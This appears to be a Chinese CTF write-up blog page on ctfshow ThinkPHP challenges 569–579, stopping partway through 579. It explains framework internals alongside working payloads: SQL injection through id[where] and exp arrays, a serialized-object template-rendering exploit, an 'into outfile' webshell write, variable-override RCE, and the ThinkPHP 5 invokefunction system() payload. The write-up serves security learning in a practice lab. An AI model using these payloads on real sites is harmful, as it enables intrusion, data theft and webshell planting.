@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - ctfshow-thinkphp专题</title>
+        <meta name="description" content="学习一下框架(姿势)。在ctfshow靶场和tp官方文档的引导下，入门丝滑。 描述：此专题专门用来深入学习thinkphp web 569 描述：本题使用的版本为3.2.3 打开题目提示thinkphp 专项训练-pathinfo的运用，flag在Admin模块的Login控制器的ctfshowLogin方法中 谷歌一…">
+    <link rel="canonical" href="https://the0n3.top/pages/c883f6/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="ctfshow-thinkphp专题">
+    <meta property="og:description" content="学习一下框架(姿势)。在ctfshow靶场和tp官方文档的引导下，入门丝滑。 描述：此专题专门用来深入学习thinkphp web 569 描述：本题使用的版本为3.2.3 打开题目提示thinkphp 专项训练-pathinfo的运用，flag在Admin模块的Login控制器的ctfshowLogin方法中 谷歌一…">
+    <meta property="og:url" content="https://the0n3.top/pages/c883f6/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/show-think/tp.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ctfshow-thinkphp专题">
+    <meta name="twitter:description" content="学习一下框架(姿势)。在ctfshow靶场和tp官方文档的引导下，入门丝滑。 描述：此专题专门用来深入学习thinkphp web 569 描述：本题使用的版本为3.2.3 打开题目提示thinkphp 专项训练-pathinfo的运用，flag在Admin模块的Login控制器的ctfshowLogin方法中 谷歌一…">
+        <meta name="twitter:image" content="https://the0n3.top/images/show-think/tp.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>ctfshow-thinkphp专题</h1>
+    <p>
+        <span class="meta">发布于: 2024-11-13 23:59</span>
+    </p>
+    <div class="post-body">
+        <p>学习一下框架(<del>姿势</del>)。在<code>ctfshow</code>靶场和tp官方文档的引导下，入门丝滑。</p>
+<p><img src="/images/show-think/tp.png" alt="tp" decoding="async" width="1000" height="500"></p>
+<!-- more -->
+<blockquote>
+<p>描述：此专题专门用来深入学习thinkphp</p>
+</blockquote>
+<h2>web 569</h2>
+<blockquote>
+<p>描述：本题使用的版本为3.2.3</p>
+</blockquote>
+<p>打开题目提示<code>thinkphp 专项训练-pathinfo的运用，flag在Admin模块的Login控制器的ctfshowLogin方法中</code></p>
+<p><img src="/images/show-think/1.png" alt="1" decoding="async" loading="lazy" width="966" height="418"></p>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1697">thinkphp3 pathinfo</a></p>
+<p>在这里，没有截全</p>
+<p><img src="/images/show-think/2.png" alt="2" decoding="async" loading="lazy" width="1059" height="858"></p>
+<p>可以了解到<code>pathinfo</code>几种模式，url默认区分大小写，可以修改默认配置</p>
+<ul>
+<li>thinkphp 3.2标准模式（pathinfo模式）</li>
+</ul>
+<p><code>http://serverName/index.php/模块/控制器/操作</code></p>
+<ul>
+<li>URL模式</li>
+</ul>
+<p>如果我们直接访问入口文件的话，由于URL中没有模块、控制器和操作，因此系统会访问默认模块（Home）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>
+<pre><code class="language-php">http://serverName/index.php
+http://serverName/index.php/Home/Index/index</code></pre>
+<ul>
+<li>普通模式</li>
+</ul>
+<p><strong>普通模式</strong>也就是传统的GET传参方式来指定当前访问的模块和操作，例如： <code>http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value</code></p>
+<p>m参数表示模块，c参数表示控制器，a参数表示操作（方法），后面的表示其他GET参数</p>
+<ul>
+<li>PATHINFO模式</li>
+</ul>
+<p><strong>PATHINFO模式</strong>是系统的默认URL模式，提供了最好的SEO支持，系统内部已经做了环境的兼容处理，所以能够支持大多数的主机环境。对应上面的URL模式，PATHINFO模式下面的URL访问地址是： <code>http://localhost/index.php/home/user/login/var/value/</code></p>
+<ul>
+<li>REWRITE模式</li>
+</ul>
+<p>REWRITE模式是在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件index.php，但是需要额外配置WEB服务器的重写规则。</p>
+<ul>
+<li>兼容模式</li>
+</ul>
+<p><strong>兼容模式</strong>是用于不支持PATHINFO的特殊环境，URL地址是： <code>http://localhost/?s=/home/user/login/var/value</code></p>
+<p>可以更改兼容模式变量的名称定义，例如：</p>
+<pre><code class="language-php">'VAR_PATHINFO'          =&gt;  'path'
+// 更改PATHINFO参数分隔符
+'URL_PATHINFO_DEPR'=&gt;'-', </code></pre>
+<p>配置后可以使用<code>http://localhost/?path=/home-user-login-var-value</code>访问</p>
+<p>啰嗦了。回归主题：<code>flag在Admin模块的Login控制器的ctfshowLogin方法中</code></p>
+<p>访问：</p>
+<p>标准模式：<code>url/index.php/Admin/Login/ctfshowLogin</code></p>
+<p>普通模式：<code>url/index.php?s=/Admin&amp;c=Login&amp;a=ctfshowLogin</code></p>
+<p>pathinfo模式(标准模式)：<code>url/index.php/Admin/Login/ctfshowLogin</code></p>
+<p>兼容模式：<code>url/index.php?s=/Admin/Login/ctfshowLogin</code></p>
+<h2>web 570</h2>
+<blockquote>
+<p>描述：黑客建立了闭包路由后门，你能找到吗</p>
+</blockquote>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1710">thinkphp3 闭包路由</a></p>
+<p>学习到了闭包路由传递参数</p>
+<p>规则路由：</p>
+<p>规则路由中定义的动态变量的名称 就是闭包函数中的参数名称，不分次序。 因此，如果我们访问的URL地址是： <code>http://serverName/Home/hello/thinkphp</code></p>
+<p>这个规则路由发现符合<code>url/hello/var/value</code>时，参数传递比较简单，直接拿进去了</p>
+<pre><code class="language-php">'hello/:name' =&gt; 
+    function($name){
+        echo 'Hello,'.$name;
+    }</code></pre>
+<p>正则路由：</p>
+<p>如果是正则路由的话，闭包函数中的参数就以正则中出现的参数次序来传递，例如：</p>
+<p>通过正则来匹配参数</p>
+<pre><code class="language-php">'/^new\/(\d{4})\/(\d{2})$/' =&gt; 
+    function($year,$month){ 
+        echo 'year='.$year.'&amp;month='.$month;
+    }</code></pre>
+<p>嘻嘻。懒得一个一个找了，直接扔d盾了，在<code>Common/Conf/config.php</code>文件里</p>
+<p><img src="/images/show-think/4.png" alt="4" decoding="async" loading="lazy" width="845" height="581"></p>
+<p>发现在<code>ctfshow</code>模块存在<code>call_user_func</code>回调函数做后门，利用一下</p>
+<pre><code class="language-php">'ctfshow/:f/:a' =&gt;function($f,$a){
+        call_user_func($f, $a);
+        }</code></pre>
+<p><img src="/images/show-think/5.png" alt="5" decoding="async" loading="lazy" width="811" height="439"></p>
+<p>测试一下，<code>url/index.php/ctfshow/assert/phpinfo();</code></p>
+<p>完美</p>
+<p><img src="/images/show-think/6.png" alt="6" decoding="async" loading="lazy" width="1126" height="567"></p>
+<p>对了。不要在参数里写<code>/</code>，这会和thinkphp这种把参数值写在url里的模式发生冲突</p>
+<p><img src="/images/show-think/7.png" alt="7" decoding="async" loading="lazy" width="1264" height="530"></p>
+<p>可以传递参数，用个POST参数绕过一下</p>
+<p><img src="/images/show-think/8.png" alt="8" decoding="async" loading="lazy" width="1224" height="473"></p>
+<h2>web 571</h2>
+<blockquote>
+<p>描述：hello,黑客建立了控制器后门，你能找到吗</p>
+</blockquote>
+<p>谷歌一下 <a href="https://www.kancloud.cn/manual/thinkphp/1713">thinkphp3 控制器</a></p>
+<p>可以学习到：</p>
+<ul>
+<li>ThinkPHP的控制器是一个类</li>
+<li>这个类(控制器)下面定义的函数叫做操作(方法)</li>
+</ul>
+<p><img src="/images/show-think/9.png" alt="9" decoding="async" loading="lazy" width="1151" height="940"></p>
+<p>例子：</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function hello(){
+        echo 'hello,thinkphp!';
+    }
+}</code></pre>
+<p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法。</p>
+<p>当访问 <code>http://serverName/index.php/Home/Index/hello</code> 后会输出：</p>
+<pre><code>hello,thinkphp!</code></pre>
+<blockquote>
+<p>这里我发现：定义的类名为<code>IndexController</code>，访问的时候却可以省略<code>Controller</code>，直接访问<code>Index</code>，奇怪了？</p>
+</blockquote>
+<p>在 ThinkPHP 中，类名后缀 Controller 可以在访问 URL 时省略，是因为框架在内部处理请求时，会自动加上这个后缀来寻找对应的控制器类。框架遵循一定的命名约定，自动匹配用户输入的控制器名称和带有 Controller 后缀的类名。</p>
+<p>回归主题：找到控制器后门</p>
+<p>丢进d盾，竟然没找到</p>
+<p>在<code>Admin/Controller/</code>路由下存在两个php文件，内容基本一下，没有看到接受参数，应该不是后门</p>
+<p><img src="/images/show-think/10.png" alt="10" decoding="async" loading="lazy" width="1076" height="435"></p>
+<p>最终可以在<code>Home/Controller/IndexController.class.php</code>文件里找到后门<code>show方法</code>，会解析php代码</p>
+<p>在这里，可以知道后门函数处于Home模块的IndexController控制器，不理解的是为什么这个函数可以接受GET、POST参数</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index($n=''){
+        $this-&gt;show($n);
+    }
+
+}</code></pre>
+<p><img src="/images/show-think/11.png" alt="11" decoding="async" loading="lazy" width="1076" height="351"></p>
+<p>这两种都可以</p>
+<p>GET：<code>url/index.php/Home/Index/index/?n=&lt;?php phpinfo();?&gt;</code></p>
+<p>POST：<code>url/index.php/Home/Index/index/</code> +  <code>n=&lt;?php phpinfo();?&gt;</code></p>
+<p>为什么这种不行？？也就是上面提到的pathinfo模式</p>
+<p>GET：<code>url/index.php/Home/Index/index/n/&lt;?php phpinfo();?&gt;</code></p>
+<h2>web 572</h2>
+<blockquote>
+<p>描述：hello,没有源码，如何获取黑客的蛛丝马迹？</p>
+</blockquote>
+<p>信息泄露挖掘，thinkphp3在调试模式下会记录详细的日志信息</p>
+<blockquote>
+<p>thinkphp在开启DEBUG的情况下会在Runtime目录下生成日志，虽然Thinkphp官方一再强调生产模式下需要关闭debug，但很多管理员还是忘记关闭。</p>
+</blockquote>
+<p>似乎是这样的，那是不是说看到鲷鱼瑟琴菠菜类网站是tp框架可以看看是否忘记关闭了调试模式呢（若有所思）</p>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1827">日志记录</a></p>
+<p><a href="https://www.cnblogs.com/Cl0ud/p/15941252.html">thinkphp日志泄露</a></p>
+<p><strong>默认情况下只是在调试模式记录日志，要在部署模式开启日志记录</strong>，必须在配置中开启<code>LOG_RECORD</code>参数，以及可以在应用配置文件中配置需要记录的日志级别，例如：</p>
+<pre><code class="language-php">'LOG_RECORD' =&gt; true, // 开启日志记录
+'LOG_LEVEL'  =&gt;'EMERG,ALERT,CRIT,ERR', // 只记录EMERG ALERT CRIT ERR 错误</code></pre>
+<p><strong>ThinkPHP3日志目录</strong>：</p>
+<ul>
+<li>
+<p>/Runtime/Logs/</p>
+</li>
+<li>
+<p>/App/Runtime/Logs/</p>
+</li>
+<li>
+<p>/Application/Runtime/Logs/Admin/</p>
+</li>
+<li>
+<p>/Application/Runtime/Logs/Home/</p>
+</li>
+<li>
+<p>/Application/Runtime/Logs/</p>
+</li>
+<li>
+<p>日志格式为：<code>/App/Runtime/Logs/21_05_17.log</code></p>
+</li>
+</ul>
+<p>TP5有所不同，这里不提</p>
+<p>回归主题：找到泄露的敏感信息（日志目录，日志文件）</p>
+<p>尝试上面列举的日志目录，看是哪一类</p>
+<p>如果是不符合的目录，tp框架似乎没有反应</p>
+<p><img src="/images/show-think/12.png" alt="12" decoding="async" loading="lazy" width="979" height="605"></p>
+<p>在试到<code>/Application/Runtime/Logs/Admin/</code>和<code>/Application/Runtime/Logs/Home/</code>类型时，页面提示<code>403</code>，说明存在，尝试访问日志<code>24_01_01.log</code>时，页面又变成之前没有反应的样子了，说明这个日志不存在，bp爆破出存在的日志，多爆几年也没什么(展示容错)，从24年开始试</p>
+<p><img src="/images/show-think/13.png" alt="13" decoding="async" loading="lazy" width="1100" height="626"></p>
+<p><img src="/images/show-think/14.png" alt="14" decoding="async" loading="lazy" width="1220" height="636"></p>
+<pre><code class="language-plaintext">GET /Application/Runtime/Logs/Admin/§24_01_01§.log HTTP/1.1
+Host: 19862dcf-d6d6-466c-a486-2836bd3ee425.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive</code></pre>
+<p><img src="/images/show-think/15.png" alt="15" decoding="async" loading="lazy" width="1027" height="696"></p>
+<p>爆破返回数据长度都一样，24年没有日志，往前试。闹麻了，爆了5年都没有，尝试下<code>/Application/Runtime/Logs/Home/</code>目录下的日志</p>
+<pre><code class="language-plaintext">GET /Application/Runtime/Logs/Home/§24_01_01§.log HTTP/1.1
+Host: 19862dcf-d6d6-466c-a486-2836bd3ee425.challenge.ctf.show
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive</code></pre>
+<p>找到线索，大概是类似前面的show方法渲染？</p>
+<pre><code class="language-plaintext">[ 2021-04-15T14:49:32+08:00 ] 127.0.0.1 /index.php?showctf=%3C?php%20phpinfo();?%3E</code></pre>
+<p><img src="/images/show-think/16.png" alt="16" decoding="async" loading="lazy" width="1600" height="657"></p>
+<p><img src="/images/show-think/17.png" alt="17" decoding="async" loading="lazy" width="1198" height="540"></p>
+<h2>web 573</h2>
+<blockquote>
+<p>描述： sql注入，flag在数据库中</p>
+</blockquote>
+<p>测试正常sql注入时，似乎不会查询，猜测tp框架内部重写了查询语句</p>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1767">查询方式</a></p>
+<blockquote>
+<p>ThinkPHP可以支持直接使用字符串作为查询条件，但是大多数情况推荐使用数组或者对象来作为查询条件，因为会更加安全。</p>
+</blockquote>
+<p>首先，支持正常的字符串查询，其次，<strong>tp框架支持且推荐以数组或者对象作为查询条件</strong>，举例</p>
+<ul>
+<li>使用数组作为查询条件</li>
+</ul>
+<p>这种方式是最常用的查询方式，例如：</p>
+<pre><code class="language-php">$User = M("User"); // 实例化User对象
+$condition['name'] = 'thinkphp';
+$condition['status'] = 1;
+// 把查询条件传入查询方法
+$User-&gt;where($condition)-&gt;select(); </code></pre>
+<p>最后生成的SQL语句是</p>
+<pre><code class="language-sql">SELECT * FROM think_user WHERE `name`='thinkphp' AND status=1</code></pre>
+<p>好了，关键就在这里，发现了吗，tp框架会把数组变量的键值对作为sql语句里的查询条件</p>
+<p>看了其他师傅的wp，发现可以给变量添加一个<code>where</code>键名，实现复写原sql语句的<code>where</code>条件！震惊</p>
+<p>回归主题：SQL注入</p>
+<p>传一个数组变量id，键名<code>where</code>，键值为查询条件，给一个错误的sql条件，报下错，验证是否能复写where</p>
+<p><img src="/images/show-think/20.png" alt="20" decoding="async" loading="lazy" width="1875" height="681"></p>
+<p>这里可以看到，条件只要合理，是完全可控的。通过测试，发现存在4个字段，第二个字段是会回显位</p>
+<p><img src="/images/show-think/21.png" alt="21" decoding="async" loading="lazy" width="1814" height="711"></p>
+<pre><code class="language-sql"># 爆库  ctfshow,ctftraining,information_schema,mysql,performance_schema,test
+?id[where]=0 union select 1,group_concat(schema_name),2,3 from information_schema.schemata%23
+# 爆表  ctfshow_users,flags,FLAG_TABLE,news,users ....
+?id[where]=0 union select 1,group_concat(table_name),2,3 from information_schema.tables%23
+# 爆字段
+?id[where]=0 union select 1,group_concat(column_name),2,3 from information_schema.columns%23
+#爆flag
+?id[where]=0 union select 1,group_concat(flag4s),2,3 from ctfshow.flags%23</code></pre>
+<p>其他师傅做到详细跟踪<a href="https://blog.csdn.net/qq_50589021/article/details/120616736">tp3 SQL注入漏洞跟踪</a></p>
+<h2>web 574</h2>
+<blockquote>
+<p>描述：sql注入，flag在数据库中</p>
+</blockquote>
+<p>给出提示：这里把接收到的参数和字符串<code>'id='</code>进行了拼接，那么间接的禁止了传入数组类型</p>
+<p>不过，这里是不是说直接把拼接的内容作为查询条件了？？？</p>
+<pre><code class="language-php">public function index($id=1){
+$name = M('Users')-&gt;where('id='.$id)-&gt;find();
+$this-&gt;show($html);
+}</code></pre>
+<p>太棒了，我喜欢！</p>
+<p><img src="/images/show-think/22.png" alt="22" decoding="async" loading="lazy" width="1865" height="647"></p>
+<p>这里的括号可以闭合，下面操作就和上题一样了。狠狠的注入正能量！</p>
+<p><img src="/images/show-think/23.png" alt="23" decoding="async" loading="lazy" width="1140" height="667"></p>
+<h2>web 575</h2>
+<blockquote>
+<p>描述：需要拿shell，稍微有点难</p>
+</blockquote>
+<p>题目给出了使用的部分源码</p>
+<p>群主的预期解是写入shell，但是使用了<code>show()</code>方法，存在渲染漏洞的非预期</p>
+<pre><code class="language-php">$user= unserialize(base64_decode(cookie('user')));
+if(!$user || $user-&gt;id!==$id){
+$user = M('Users');
+$user-&gt;find(intval($id));
+cookie('user',base64_encode(serialize($user-&gt;data())));
+}
+$this-&gt;show($user-&gt;username);
+}</code></pre>
+<p>这里需要谷歌的是<a href="https://www.kancloud.cn/manual/thinkphp/1696">模块化设计</a></p>
+<p>在源码里出现了一次<code>M('Users')</code>，说明使用了<code>Model</code>模块，在tp框架中，Model模块定义在Thinkphp下，如果要玩非预期的打法，需要继承一下<code>Think\Model</code>，在反序列化时会找不到类，导致反序列化失败</p>
+<p><img src="/images/show-think/24.png" alt="24" decoding="async" loading="lazy" width="420" height="430"></p>
+<p>如果反序列化成功且传入的id和反序列化的id相同，会直接渲染反序列化对象$user的username属性。在if条件语句里执行了<code>M('Users')</code>，使用反序列化恢复了一个<code>Model</code>对象，可以知道，需要使用<code>Model</code>类</p>
+<p><img src="/images/show-think/25.png" alt="25" decoding="async" loading="lazy" width="1058" height="514"></p>
+<p>只需要控制$username属性，就可以实现渲染php代码</p>
+<p>exp:</p>
+<pre><code class="language-php">&lt;?php
+namespace Think;
+class Model{
+    public $id='2';
+    public $username="&lt;?php phpinfo();?&gt;";
+}
+$payload = new Model();
+var_dump($payload);
+echo 'paylaod$： '.base64_encode(serialize($payload));</code></pre>
+<p>base64结果可以url编码一下更好</p>
+<p><img src="/images/show-think/26.png" alt="26" decoding="async" loading="lazy" width="1462" height="475"></p>
+<p><img src="/images/show-think/27.png" alt="27" decoding="async" loading="lazy" width="1877" height="733"></p>
+<p>另外一种<code>需要拿shell，稍微有点难</code>，看其他师傅博客的poc好长，等我变成tp大佬就回来分析(星星眼)</p>
+<h2>web 576</h2>
+<blockquote>
+<p>描述：注释注入，需要拿shell</p>
+</blockquote>
+<pre><code class="language-php">$user = M('Users')-&gt;comment($id)-&gt;find(intval($id));</code></pre>
+<p>调用了<code>comment()</code>方法，项目源码里审计一下，审计了个寂寞</p>
+<p><img src="/images/show-think/28.png" alt="28" decoding="async" loading="lazy" width="1197" height="913"></p>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1750">thinkphp3 comment</a></p>
+<p>看到了吗，<code>comment()</code>方法里的内容直接左右拼接注释符<code>/**/</code>，最后再拼接到原语句的最后，可以坏坏！！</p>
+<p>我们在<code>comment()</code>方法里传入<code>/*</code>、<code>*/</code>，就可以闭合<code>comment()</code>方法里的注释符，在最后的拼接环节实现sql注入</p>
+<p><img src="/images/show-think/29.png" alt="29" decoding="async" loading="lazy" width="1605" height="671"></p>
+<p>尝试闭合前半部分，让sql报错</p>
+<p><img src="/images/show-think/30.png" alt="30" decoding="async" loading="lazy" width="1860" height="593"></p>
+<p>闭合后半部分后，正常查询，当然，后半部分也可以直接通过<code>#</code>注释掉</p>
+<p><img src="/images/show-think/31.png" alt="31" decoding="async" loading="lazy" width="1047" height="596"></p>
+<p>那么，在两个注释之间的内容就是我们拼接到sql语句里的可控部分了，这里似乎不存在堆叠注入，道友们可以尝试一下</p>
+<p>在这个sql语句里，<code>intval($id)</code>查询了一个id，返回结果是当前表里的内容，不可控了。我们可以控制sql语句结束时的操作，例如：把查询内容写进文件，可以控制文件名，实现写一个木马，使用mysql的骚操作，更改间隔符，填充木马内容。如此，在sql查询内容受限的添加下写入木马</p>
+<p><a href="https://www.runoob.com/mysql/mysql-database-import.html">Mysql指定文件分隔符</a></p>
+<p><img src="/images/show-think/32.png" alt="32" decoding="async" loading="lazy" width="1372" height="679"></p>
+<pre><code class="language-sql">?id=1*/ into outfile '/var/www/html/1.php' LINES STARTING BY '&lt;?php highlight_file(__FILE__);eval($_GET[1]);?&gt;'%23</code></pre>
+<p><img src="/images/show-think/33.png" alt="33" decoding="async" loading="lazy" width="1872" height="946"></p>
+<h2>web 577</h2>
+<blockquote>
+<p>描述：flag在数据库里</p>
+</blockquote>
+<pre><code class="language-php">$map=array(
+'id'=&gt;$_GET['id']
+);
+$user = M('Users')-&gt;where($map)-&gt;find();</code></pre>
+<p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1735">thinkphp3 where(</a></p>
+<p><img src="/images/show-think/34.png" alt="34" decoding="async" loading="lazy" width="1433" height="911"></p>
+<p>在官方文档里可以学习到</p>
+<pre><code class="language-php">$map['字段1']  = array('表达式','查询条件1');
+$map['字段2']  = array('表达式','查询条件2');
+$Model-&gt;where($map)-&gt;select(); // 也支持</code></pre>
+<p>那么是不是等效：</p>
+<pre><code class="language-php">$map = arrray(
+    "字段1" =&gt; array('表达式','查询条件1'),
+    "字段2" =&gt; array('表达式','查询条件2')
+)</code></pre>
+<p>到这里，你有思路了吗？<code>$_GET[id]</code>可以是一个数组类型，数组的第一个值作为表达式，第二个值作为查询条件！！再回顾一下这个图，思考这个<code>$map</code>是怎么和<code>where</code>一起使用的</p>
+<p><img src="/images/show-think/34.png" alt="34" decoding="async" loading="lazy" width="1433" height="911"></p>
+<p>我的看法是：sql语句中的where会根据指定的<code>表达式</code>类型，选择<code>字段</code>和<code>查询条件</code>的处理逻辑</p>
+<pre><code class="language-sql">where 字段?查询条件(表达式)  </code></pre>
+<p>选择<code>exp</code>类型，那么查询条件可以使用一条sql语句！</p>
+<p>开搞，根据报错信息，合理调整，注意前面多补个<code>=</code>等号，把字段和查询语句拼接起来</p>
+<p><img src="/images/show-think/35.png" alt="35" decoding="async" loading="lazy" width="1724" height="577"></p>
+<p>第二个是回显位，开！！！</p>
+<pre><code class="language-sql">?id[0]=exp&amp;id[1]==0 union select 1,2,3,4%23
+?id[0]=exp&amp;id[1]==0 union select 1,group_concat(flag4s),3,4 from flags%23</code></pre>
+<h2>web 578</h2>
+<blockquote>
+<p>描述：变量覆盖导致rce</p>
+</blockquote>
+<pre><code class="language-php">public function index($name='',$from='ctfshow'){
+$this-&gt;assign($name,$from);
+$this-&gt;display('index');
+}</code></pre>
+<p>下面要献丑了，过两天一定学vscode或者phpstorm动调</p>
+<p>在tp框架里查找<code>assign()</code>方法的定义，没什么敏感内容。不过注释里写<code>模板变量赋值</code>，往下看有没有模板解析</p>
+<pre><code class="language-php">public function assign($name, $value = '')
+    {
+        if (is_array($name)) {
+            $this-&gt;tVar = array_merge($this-&gt;tVar, $name);
+        } else {
+            $this-&gt;tVar[$name] = $value;
+        }
+    }</code></pre>
+<p><img src="/images/show-think/36.png" alt="36" decoding="async" loading="lazy" width="1446" height="918"></p>
+<p>下面定义了一个解析的<code>fetch()</code>函数，解析模板输出内容，重点：里面多次使用了extract函数覆盖变量，多次使用文件包含模板文件，或者使用eval解析php内容</p>
+<p><img src="/images/show-think/37.png" alt="37" decoding="async" loading="lazy" width="1265" height="956"></p>
+<p>截取部分<code>fetch()</code>函数代码，看到如果<code>$this-&gt;tVar['content']</code>存在，那么<code>extract()</code>函数会覆盖当前作用域的变量，然后<code>eval()</code>函数解析php代码，回去看<code>assign()函数</code>，看看<code>$this-&gt;tVar['content']</code>是怎么来的</p>
+<pre><code class="language-php">(isset($this-&gt;tVar['content'])) {
+    $__content__ = $content;
+    extract($this-&gt;tVar, EXTR_OVERWRITE);
+    eval('?&gt;' . $__content__);
+} else {
+    extract($this-&gt;tVar, EXTR_OVERWRITE);
+    eval('?&gt;' . $content);
+}</code></pre>
+<p>在这个<code>assign()函数</code>里，判断在属性<code>$this-&gt;tVar</code>里是否存在第一个参数，如果不存在，使用<code>array_merge($this-&gt;tVar, $name);</code>给<code>$this-&gt;tVar</code>添加新属性和值，如果存在，直接把参数值<code>$value</code>赋值给<code>$this-&gt;tVar</code>，总之会把$name赋值给<code>$this-&gt;tVar</code>。我们可以给他一个<code>content</code>参数，渲染php代码</p>
+<p>环境问题，我还一直以为我的是tp3.2.3，原来是tp3.2.5，天塌了</p>
+<p><a href="https://github.com/top-think/thinkphp/releases/tag/3.2.3">v3.2.3项目地址</a></p>
+<p>ok啊，不好意思。让我们重新开始，tp323和tp325版本只有这个<code>fetch</code>函数稍有不同</p>
+<p>fetch函数：</p>
+<p>extract() 是 PHP 的一个内置函数，它将数组 $this-&gt;tVar 中的键值对转换为独立的 PHP 变量，如果<code>$this-&gt;tVar</code>数组里有<code>_content</code>属性，那么会覆盖当前作用域的<code>_content</code>变量，<code>eval('?&gt;' . $_content);</code>解析执行一个php代码</p>
+<pre><code class="language-php">if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) {
+            // 使用PHP原生模板
+            $_content = $content;
+            // 模板阵列变量分解成为独立变量
+            extract($this-&gt;tVar, EXTR_OVERWRITE);
+            // 直接载入PHP模板
+            empty($_content) ? include $templateFile : eval('?&gt;' . $_content);
+        } </code></pre>
+<p>所以直接在这里传值覆盖一下<code>$this-&gt;assign($name,$from);</code></p>
+<p>因为assgin的if判断两种格式总之都是给属性<code>$this-&gt;tVar</code>添加新属性，所以payload有两种写法</p>
+<pre><code class="language-php">?name[_content]=&lt;?php phpinfo();?&gt;
+?name=_content&amp;from=&lt;?php phpinfo();?&gt;</code></pre>
+<h2>web 579</h2>
+<blockquote>
+<p>描述：未开启强制路由RCE</p>
+</blockquote>
+<p>在tp官方文档里了解到了<code>强制模式</code>，像<code>flask</code>框架一样，只有定义的路由可以正常访问，否则抛出异常</p>
+<p><img src="/images/show-think/39.png" alt="39" decoding="async" loading="lazy" width="1018" height="408"></p>
+<p>在网上找到了<a href="https://www.modb.pro/db/501435">相关文章及poc</a>，强制路由RCE漏洞Thinkphp5<code>5.0.0 - 5.1.30 远程代码执行（路由处理漏洞）</code></p>
+<p><img src="/images/show-think/38.png" alt="38" decoding="async" loading="lazy" width="833" height="710"></p>
+<p>其他师傅博客wp里的<code>payload</code>：<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code>，跟着到源项目里跟一下漏洞点</p>
+<p><a href="https://github.com/top-think/framework/tree/v5.1.28">v5.1.28项目地址</a></p>
+<p>在本地用phpstudy的composer在www目录搭个tp5.0.*的环境</p>
+<pre><code class="language-shell">composer create-project topthink/think=5.0.* tp5  --prefer-dist</code></pre>
+<p>在源码里找到了漏洞点！！在<code>./tp5/thinkphp/library/think/App.php</code>中，定义了payload里利用的<code>invokefunc</code>方法</p>
